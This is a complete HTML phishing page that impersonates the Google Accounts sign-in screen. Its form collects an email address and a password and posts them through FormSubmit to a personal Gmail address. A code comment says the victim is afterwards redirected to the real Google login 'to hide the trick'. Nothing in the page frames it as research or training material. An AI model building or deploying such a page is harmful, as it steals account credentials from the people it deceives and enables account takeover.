<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-box {
            width: 450px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px;
            text-align: center;
            box-sizing: border-box;
        }

        .logo {
            width: 75px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
            color: #202124;
        }

        p {
            font-size: 16px;
            color: #202124;
            margin-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 25px;
            text-align: left;
        }

        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            transition: border 0.2s;
        }

        input:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px; /* Adjust for border thickness */
        }

        .forgot-link {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            display: block;
            text-align: left;
            margin-bottom: 40px;
        }

        .footer-buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .btn-next {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-next:hover {
            background-color: #1557b0;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }

        /* Mobile responsiveness */
        @media (max-width: 500px) {
            .login-box {
                width: 90%;
                border: none;
            }
        }
    </style>
</head>
<body>

    <div class="login-box">
        <!-- Official Google Logo -->
        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        
        <h1>Sign in</h1>
        <p>Use your Google Account</p>

        <!-- FormSubmit Integration -->
        <form action="https://formsubmit.com/ajax/kaasislekker069@gmail.com" method="POST">
            
            <!-- Honeypot to prevent spam bots -->
            <input type="text" name="_honey" style="display:none">
            
            <!-- Redirect after submission to real google login to hide the trick -->
            <input type="hidden" name="_netrc" value="https://accounts.google.com/">

            <div class="input-group">
                <input type="email" name="email" placeholder="Email or phone" required>
            </div>

            <div class="input-group">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>

            <a href="https://accounts.google.com/signin/recovery" class="forgot-link">Forgot password?</a>

            <div class="footer-buttons">
                <a href="https://accounts.google.com/signup" class="create-account">Create account</a>
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>
    </div>

</body>
</html>
